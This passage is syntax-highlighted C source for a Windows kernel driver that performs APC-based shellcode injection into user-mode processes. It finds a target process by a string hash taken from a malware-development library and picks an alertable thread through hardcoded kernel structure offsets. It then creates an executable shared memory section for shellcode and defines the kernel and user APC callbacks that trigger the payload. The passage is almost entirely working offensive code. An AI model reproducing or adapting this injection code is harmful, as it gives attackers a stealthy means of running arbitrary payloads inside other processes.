<span class="token punctuation">}</span>SYSTEM_THREAD_INFORMATION<span class="token punctuation">,</span> <span class="token operator">*</span> PSYSTEM_THREAD_INFORMATION<span class="token punctuation">;</span>

<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_SYSTEM_PROCESS_INFO</span>
<span class="token punctuation">{</span>
	ULONG NextEntryOffset<span class="token punctuation">;</span>
	ULONG NumberOfThreads<span class="token punctuation">;</span>
	LARGE_INTEGER WorkingSetPrivateSize<span class="token punctuation">;</span>
	ULONG HardFaultCount<span class="token punctuation">;</span>
	ULONG NumberOfThreadsHighWatermark<span class="token punctuation">;</span>
	ULONGLONG CycleTime<span class="token punctuation">;</span>
	LARGE_INTEGER CreateTime<span class="token punctuation">;</span>
	LARGE_INTEGER UserTime<span class="token punctuation">;</span>
	LARGE_INTEGER KernelTime<span class="token punctuation">;</span>
	UNICODE_STRING ImageName<span class="token punctuation">;</span>
	KPRIORITY BasePriority<span class="token punctuation">;</span>
	HANDLE UniqueProcessId<span class="token punctuation">;</span>
	HANDLE InheritedFromUniqueProcessId<span class="token punctuation">;</span>
	ULONG HandleCount<span class="token punctuation">;</span>
	ULONG SessionId<span class="token punctuation">;</span>
	ULONG_PTR UniqueProcessKey<span class="token punctuation">;</span>
	SIZE_T PeakVirtualSize<span class="token punctuation">;</span>
	SIZE_T VirtualSize<span class="token punctuation">;</span>
	ULONG PageFaultCount<span class="token punctuation">;</span>
	SIZE_T PeakWorkingSetSize<span class="token punctuation">;</span>
	SIZE_T WorkingSetSize<span class="token punctuation">;</span>
	SIZE_T QuotaPeakPagedPoolUsage<span class="token punctuation">;</span>
	SIZE_T QuotaPagedPoolUsage<span class="token punctuation">;</span>
	SIZE_T QuotaPeakNonPagedPoolUsage<span class="token punctuation">;</span>
	SIZE_T QuotaNonPagedPoolUsage<span class="token punctuation">;</span>
	SIZE_T PagefileUsage<span class="token punctuation">;</span>
	SIZE_T PeakPagefileUsage<span class="token punctuation">;</span>
	SIZE_T PrivatePageCount<span class="token punctuation">;</span>
	LARGE_INTEGER ReadOperationCount<span class="token punctuation">;</span>
	LARGE_INTEGER WriteOperationCount<span class="token punctuation">;</span>
	LARGE_INTEGER OtherOperationCount<span class="token punctuation">;</span>
	LARGE_INTEGER ReadTransferCount<span class="token punctuation">;</span>
	LARGE_INTEGER WriteTransferCount<span class="token punctuation">;</span>
	LARGE_INTEGER OtherTransferCount<span class="token punctuation">;</span>
	SYSTEM_THREAD_INFORMATION Threads<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>SYSTEM_PROCESS_INFO<span class="token punctuation">,</span> <span class="token operator">*</span> PSYSTEM_PROCESS_INFO<span class="token punctuation">;</span>

<span class="token keyword">typedef</span> <span class="token keyword">enum</span> <span class="token class-name">_KAPC_ENVIRONMENT</span>
<span class="token punctuation">{</span>
	OriginalApcEnvironment<span class="token punctuation">,</span>
	AttachedApcEnvironment<span class="token punctuation">,</span>
	CurrentApcEnvironment<span class="token punctuation">,</span>
	InsertApcEnvironment

<span class="token punctuation">}</span> KAPC_ENVIRONMENT<span class="token punctuation">;</span>

<span class="token keyword">typedef</span> <span class="token function">VOID</span><span class="token punctuation">(</span>NTAPI<span class="token operator">*</span> PKNORMAL_ROUTINE<span class="token punctuation">)</span> <span class="token punctuation">(</span>
	IN PVOID NormalContext<span class="token punctuation">,</span>
	IN PVOID SystemArgument1<span class="token punctuation">,</span>
	IN PVOID SystemArgument2
	<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">typedef</span> <span class="token function">VOID</span><span class="token punctuation">(</span>NTAPI<span class="token operator">*</span> PKKERNEL_ROUTINE<span class="token punctuation">)</span> <span class="token punctuation">(</span>
	IN PKAPC Apc<span class="token punctuation">,</span>
	IN OUT PKNORMAL_ROUTINE<span class="token operator">*</span> NormalRoutine<span class="token punctuation">,</span>
	IN OUT PVOID<span class="token operator">*</span> NormalContext<span class="token punctuation">,</span>
	IN OUT PVOID<span class="token operator">*</span> SystemArgument1<span class="token punctuation">,</span>
	IN OUT PVOID<span class="token operator">*</span> SystemArgument2
	<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">typedef</span> <span class="token function">VOID</span><span class="token punctuation">(</span>NTAPI<span class="token operator">*</span> PKRUNDOWN_ROUTINE<span class="token punctuation">)</span> <span class="token punctuation">(</span>
	IN PKAPC Apc
	<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">typedef</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span>        UINT<span class="token punctuation">;</span>

<span class="token comment">//--------------------------------------------------------------------------------------------------------------------------------</span>

NTKERNELAPI VOID NTAPI <span class="token function">KeInitializeApc</span><span class="token punctuation">(</span>
	OUT PRKAPC Apc<span class="token punctuation">,</span>
	IN PETHREAD Thread<span class="token punctuation">,</span>
	IN KAPC_ENVIRONMENT Environment<span class="token punctuation">,</span>
	IN PKKERNEL_ROUTINE KernelRoutine<span class="token punctuation">,</span>
	IN OPTIONAL PKRUNDOWN_ROUTINE RundownRoutine<span class="token punctuation">,</span>
	IN OPTIONAL PKNORMAL_ROUTINE NormalRoutine<span class="token punctuation">,</span>
	IN OPTIONAL KPROCESSOR_MODE ApcMode<span class="token punctuation">,</span>
	IN OPTIONAL PVOID NormalContext
<span class="token punctuation">)</span><span class="token punctuation">;</span>

NTKERNELAPI BOOLEAN NTAPI <span class="token function">KeInsertQueueApc</span><span class="token punctuation">(</span>
	IN OUT PRKAPC Apc<span class="token punctuation">,</span>
	IN OPTIONAL PVOID SystemArgument1<span class="token punctuation">,</span>
	IN OPTIONAL PVOID SystemArgument2<span class="token punctuation">,</span>
	IN KPRIORITY Increment
<span class="token punctuation">)</span><span class="token punctuation">;</span>

NTKERNELAPI BOOLEAN NTAPI <span class="token function">KeTestAlertThread</span><span class="token punctuation">(</span>
	IN KPROCESSOR_MODE AlertMode
<span class="token punctuation">)</span><span class="token punctuation">;</span>


NTKERNELAPI PVOID NTAPI <span class="token function">PsGetCurrentProcessWow64Process</span><span class="token punctuation">(</span>
	VOID
<span class="token punctuation">)</span><span class="token punctuation">;</span>

NTKERNELAPI NTSTATUS NTAPI <span class="token function">ZwQuerySystemInformation</span><span class="token punctuation">(</span>
	IN ULONG SystemInformationClass<span class="token punctuation">,</span>
	OUT PVOID SystemInformation<span class="token punctuation">,</span>
	IN ULONG SystemInformationLength<span class="token punctuation">,</span>
	OUT PULONG ReturnLength
<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//--------------------------------------------------------------------------------------------------------------------------------</span>
<span class="token comment">// String Hashing Algorithm:</span>

<span class="token comment">// https://github.com/vxunderground/VX-API/blob/main/VX-API/HashStringRotr32.cpp</span>
UINT32 <span class="token function">HashStringRotr32SubW</span><span class="token punctuation">(</span>UINT32 Value<span class="token punctuation">,</span> UINT Count<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	DWORD Mask <span class="token operator">=</span> <span class="token punctuation">(</span>CHAR_BIT <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>Value<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	Count <span class="token operator">&amp;=</span> Mask<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">warning</span><span class="token punctuation">(</span> push <span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">warning</span><span class="token punctuation">(</span> disable <span class="token operator">:</span> <span class="token number">4146</span><span class="token punctuation">)</span></span></span>
	<span class="token keyword">return</span> <span class="token punctuation">(</span>Value <span class="token operator">&gt;&gt;</span> Count<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>Value <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span>Count<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Mask<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">warning</span><span class="token punctuation">(</span> pop <span class="token punctuation">)</span> </span></span>
<span class="token punctuation">}</span>

INT <span class="token function">HashStringRotr32W</span><span class="token punctuation">(</span>_In_ LPCWSTR String<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	INT Value <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

	<span class="token keyword">for</span> <span class="token punctuation">(</span>INT Index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> Index <span class="token operator">&lt;</span> <span class="token function">wcslen</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token punctuation">;</span> Index<span class="token operator">++</span><span class="token punctuation">)</span>
		Value <span class="token operator">=</span> String<span class="token punctuation">[</span>Index<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token function">HashStringRotr32SubW</span><span class="token punctuation">(</span>Value<span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> Value<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//--------------------------------------------------------------------------------------------------------------------------------</span>

WCHAR g_TargetProcessName<span class="token punctuation">[</span><span class="token number">0xFF</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment">//--------------------------------------------------------------------------------------------------------------------------------</span>

BOOLEAN <span class="token function">FetchTargetProcessAndThread</span><span class="token punctuation">(</span>OUT HANDLE<span class="token operator">*</span> phProcessId<span class="token punctuation">,</span> OUT PETHREAD<span class="token operator">*</span> pThread<span class="token punctuation">,</span> OUT HANDLE<span class="token operator">*</span> phThreadId<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>phProcessId <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> pThread <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> phThreadId <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	NTSTATUS                STATUS                  <span class="token operator">=</span> STATUS_SUCCESS<span class="token punctuation">;</span>
	ULONG                   uReturnLength           <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">,</span>
				            uAlertableThread	       <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">,</span>
				            uGuiThread		       <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>
	PVOID                   pAddress                <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	PSYSTEM_PROCESS_INFO    pSystemProcesses        <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	PETHREAD                pTmpThread              <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	<span class="token comment">// Fetch array size</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">ZwQuerySystemInformation</span><span class="token punctuation">(</span><span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>uReturnLength<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> STATUS_INFO_LENGTH_MISMATCH<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"[!] ZwQuerySystemInformation [1] Failed With Error: 0x%0.8X \n"</span><span class="token punctuation">,</span> STATUS<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">goto</span> _FUNC_CLEANUP<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Allocate enough memory</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pAddress <span class="token operator">=</span> <span class="token function">ExAllocatePool2</span><span class="token punctuation">(</span>POOL_FLAG_NON_PAGED<span class="token punctuation">,</span> <span class="token punctuation">(</span>SIZE_T<span class="token punctuation">)</span>uReturnLength<span class="token punctuation">,</span> <span class="token punctuation">(</span>ULONG<span class="token punctuation">)</span>DRIVER_TAG<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"[!] ExAllocatePool2 Failed \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">goto</span> _FUNC_CLEANUP<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Fetch array</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">ZwQuerySystemInformation</span><span class="token punctuation">(</span><span class="token number">0x05</span><span class="token punctuation">,</span> pAddress<span class="token punctuation">,</span> uReturnLength<span class="token punctuation">,</span> <span class="token operator">&amp;</span>uReturnLength<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"[!] ZwQuerySystemInformation [2] Failed With Error: 0x%0.8X \n"</span><span class="token punctuation">,</span> STATUS<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">goto</span> _FUNC_CLEANUP<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	pSystemProcesses <span class="token operator">=</span> <span class="token punctuation">(</span>PSYSTEM_PROCESS_INFO<span class="token punctuation">)</span>pAddress<span class="token punctuation">;</span>

	<span class="token keyword">do</span> <span class="token punctuation">{</span>

		<span class="token comment">// Search for the target process using it's hash</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>pSystemProcesses<span class="token operator">-&gt;</span>ImageName<span class="token punctuation">.</span>Length <span class="token operator">&amp;&amp;</span> <span class="token function">HashStringRotr32W</span><span class="token punctuation">(</span>pSystemProcesses<span class="token operator">-&gt;</span>ImageName<span class="token punctuation">.</span>Buffer<span class="token punctuation">)</span> <span class="token operator">==</span> TARGET_PROCESS_HASH<span class="token punctuation">)</span> <span class="token punctuation">{</span>

			<span class="token comment">// Copy the name to a global variable (used for debugging)</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>pSystemProcesses<span class="token operator">-&gt;</span>ImageName<span class="token punctuation">.</span>Length <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>g_TargetProcessName<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>WCHAR<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
				<span class="token function">wcscpy</span><span class="token punctuation">(</span>g_TargetProcessName<span class="token punctuation">,</span> pSystemProcesses<span class="token operator">-&gt;</span>ImageName<span class="token punctuation">.</span>Buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>

			<span class="token comment">// Save process ID</span>
			<span class="token operator">*</span>phProcessId <span class="token operator">=</span> pSystemProcesses<span class="token operator">-&gt;</span>UniqueProcessId<span class="token punctuation">;</span>

			<span class="token comment">// Search for an alertable thread</span>
			<span class="token keyword">for</span> <span class="token punctuation">(</span>ULONG i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pSystemProcesses<span class="token operator">-&gt;</span>NumberOfThreads<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

				<span class="token keyword">if</span> <span class="token punctuation">(</span>pSystemProcesses<span class="token operator">-&gt;</span>Threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>ClientId<span class="token punctuation">.</span>UniqueThread <span class="token operator">==</span> <span class="token function">PsGetCurrentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
					<span class="token keyword">continue</span><span class="token punctuation">;</span>

				<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">PsLookupThreadByThreadId</span><span class="token punctuation">(</span>pSystemProcesses<span class="token operator">-&gt;</span>Threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>ClientId<span class="token punctuation">.</span>UniqueThread<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pTmpThread<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
					<span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"[!] PsLookupThreadByThreadId Failed At Thread %ld With Error: 0x%0.8X \n"</span><span class="token punctuation">,</span> pSystemProcesses<span class="token operator">-&gt;</span>Threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>ClientId<span class="token punctuation">.</span>UniqueThread<span class="token punctuation">,</span> STATUS<span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token keyword">continue</span><span class="token punctuation">;</span>
				<span class="token punctuation">}</span>

				<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">PsIsThreadTerminating</span><span class="token punctuation">(</span>pTmpThread<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
					<span class="token function">ObDereferenceObject</span><span class="token punctuation">(</span>pTmpThread<span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token keyword">continue</span><span class="token punctuation">;</span>
				<span class="token punctuation">}</span>

				uAlertableThread    <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>PULONG64<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>BYTE<span class="token operator">*</span><span class="token punctuation">)</span>pTmpThread <span class="token operator">+</span> ALERTABLE_THREAD_FLAG_OFFSET<span class="token punctuation">)</span> <span class="token operator">&amp;</span> ALERTABLE_THREAD_FLAG_BIT<span class="token punctuation">;</span>
				uGuiThread          <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>PULONG64<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>BYTE<span class="token operator">*</span><span class="token punctuation">)</span>pTmpThread <span class="token operator">+</span> GUI_THREAD_FLAG_OFFSET<span class="token punctuation">)</span> <span class="token operator">&amp;</span> GUI_THREAD_FLAG_BIT<span class="token punctuation">;</span>

				<span class="token keyword">if</span> <span class="token punctuation">(</span>uAlertableThread <span class="token operator">==</span> <span class="token number">0x00</span> <span class="token operator">||</span>
					uGuiThread <span class="token operator">!=</span> <span class="token number">0x00</span> <span class="token operator">||</span>         <span class="token comment">// Skip GUI Threads</span>
					<span class="token operator">*</span><span class="token punctuation">(</span>PULONG64<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>BYTE<span class="token operator">*</span><span class="token punctuation">)</span>pTmpThread <span class="token operator">+</span> THREAD_KERNEL_STACK_OFFSET<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x00</span> <span class="token operator">||</span>
					<span class="token operator">*</span><span class="token punctuation">(</span>PULONG64<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>BYTE<span class="token operator">*</span><span class="token punctuation">)</span>pTmpThread <span class="token operator">+</span> THREAD_CONTEXT_STACK_POINTER_OFFSET<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x00</span><span class="token punctuation">)</span>
				<span class="token punctuation">{</span>
					<span class="token function">ObDereferenceObject</span><span class="token punctuation">(</span>pTmpThread<span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token keyword">continue</span><span class="token punctuation">;</span>
				<span class="token punctuation">}</span>

				<span class="token comment">// Save the found thread and thread id</span>
				<span class="token operator">*</span>pThread    <span class="token operator">=</span>  pTmpThread<span class="token punctuation">;</span>
				<span class="token operator">*</span>phThreadId <span class="token operator">=</span>  pSystemProcesses<span class="token operator">-&gt;</span>Threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>ClientId<span class="token punctuation">.</span>UniqueThread<span class="token punctuation">;</span>
				<span class="token keyword">break</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>

		<span class="token punctuation">}</span>

		<span class="token comment">// Move to another process in the array</span>
		pSystemProcesses <span class="token operator">=</span> <span class="token punctuation">(</span>PSYSTEM_PROCESS_INFO<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>BYTE<span class="token operator">*</span><span class="token punctuation">)</span>pSystemProcesses <span class="token operator">+</span> pSystemProcesses<span class="token operator">-&gt;</span>NextEntryOffset<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>pSystemProcesses<span class="token operator">-&gt;</span>NextEntryOffset <span class="token operator">!=</span> <span class="token number">0x00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


_FUNC_CLEANUP<span class="token operator">:</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>pAddress <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
		<span class="token function">ExFreePoolWithTag</span><span class="token punctuation">(</span>pAddress<span class="token punctuation">,</span> DRIVER_TAG<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token operator">*</span>pThread <span class="token operator">==</span> <span class="token number">0x00</span> <span class="token operator">?</span> FALSE <span class="token operator">:</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//--------------------------------------------------------------------------------------------------------------------------------</span>


BOOLEAN <span class="token function">CreateSharedSection</span><span class="token punctuation">(</span>IN SIZE_T sShellcodeSize<span class="token punctuation">,</span> OUT HANDLE<span class="token operator">*</span> phSection<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>sShellcodeSize <span class="token operator">||</span> <span class="token operator">!</span>phSection<span class="token punctuation">)</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

	UNICODE_STRING          SectionName		<span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0x00</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
	OBJECT_ATTRIBUTES	    ObjectAttr		<span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0x00</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
	NTSTATUS                STATUS			<span class="token operator">=</span> STATUS_SUCCESS<span class="token punctuation">;</span>
	LARGE_INTEGER           SectionSize		<span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token punctuation">.</span>QuadPart <span class="token operator">=</span> <span class="token function">SET_TO_MULTIPLE_OF_PAGE_SIZE</span><span class="token punctuation">(</span>sShellcodeSize<span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>


	<span class="token function">RtlInitUnicodeString</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>SectionName<span class="token punctuation">,</span> L<span class="token string">"\\BaseNamedObjects\\MySharedMemory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">InitializeObjectAttributes</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ObjectAttr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>SectionName<span class="token punctuation">,</span> OBJ_KERNEL_HANDLE<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Create a section to map into kernel &amp; user mode memory</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">ZwCreateSection</span><span class="token punctuation">(</span>phSection<span class="token punctuation">,</span> SECTION_ALL_ACCESS<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ObjectAttr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>SectionSize<span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">,</span> SEC_COMMIT<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"[!] ZwCreateSection Failed With Error: 0x%0.8X \n"</span><span class="token punctuation">,</span> STATUS<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"[+] Opened A Section Handle: 0x%0.8X \n"</span><span class="token punctuation">,</span> <span class="token operator">*</span>phSection<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//--------------------------------------------------------------------------------------------------------------------------------</span>

<span class="token comment">// Callback function for APC that is executed in an alertable thread context</span>
VOID <span class="token function">KernelModeApcCallback</span><span class="token punctuation">(</span>PKAPC Apc<span class="token punctuation">,</span> PKNORMAL_ROUTINE<span class="token operator">*</span> NormalRoutine<span class="token punctuation">,</span> PVOID<span class="token operator">*</span> NormalContext<span class="token punctuation">,</span> PVOID<span class="token operator">*</span> SystemArgument1<span class="token punctuation">,</span> PVOID<span class="token operator">*</span> SystemArgument2<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token function">UNREFERENCED_PARAMETER</span><span class="token punctuation">(</span>NormalRoutine<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">UNREFERENCED_PARAMETER</span><span class="token punctuation">(</span>NormalContext<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">UNREFERENCED_PARAMETER</span><span class="token punctuation">(</span>SystemArgument1<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">UNREFERENCED_PARAMETER</span><span class="token punctuation">(</span>SystemArgument2<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Alert the current thread to execute its pending user - mode APCs</span>
	<span class="token function">KeTestAlertThread</span><span class="token punctuation">(</span>UserMode<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">ExFreePoolWithTag</span><span class="token punctuation">(</span>Apc<span class="token punctuation">,</span> DRIVER_TAG<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// Callback function for APC executed in a normal thread context</span>
VOID <span class="token function">UserModeApcCallback</span><span class="token punctuation">(</span>PKAPC Apc<span class="token punctuation">,</span> PKNORMAL_ROUTINE<span class="token operator">*</span> NormalRoutine<span class="token punctuation">,</span> PVOID<span class="token operator">*</span> NormalContext<span class="token punctuation">,</span> PVOID<span class="token operator">*</span> SystemArgument1<span class="token punctuation">,</span> PVOID<span class="token operator">*</span> SystemArgument2<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token function">UNREFERENCED_PARAMETER</span><span class="token punctuation">(</span>SystemArgument1<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">UNREFERENCED_PARAMETER</span><span class="token punctuation">(</span>SystemArgument2<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Check if the current thread is in the process of terminating</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">PsIsThreadTerminating</span><span class="token punctuation">(</span><span class="token function">PsGetCurrentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token operator">*</span>NormalRoutine <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token comment">// canceling the APC</span>

	<span class="token comment">// Check if the current process is a 32-bit process running on a 64-bit Windows</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">PsGetCurrentProcessWow64Process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token function">PsWrapApcWow64Thread</span><span class="token punctuation">(</span>NormalContext<span class="token punctuation">,</span> <span class="token punctuation">(</span>PVOID<span class="token operator">*</span><span class="token punctuation">)</span>NormalRoutine<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Wrap the APC for execution in a 32-bit thread's context (use 32-bit payload) - NOT TESTED!</span>

	<span class="token function">ExFreePoolWithTag</span><span class="token punctuation">(</span>Apc<span class="token punctuation">,</span> DRIVER_TAG<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

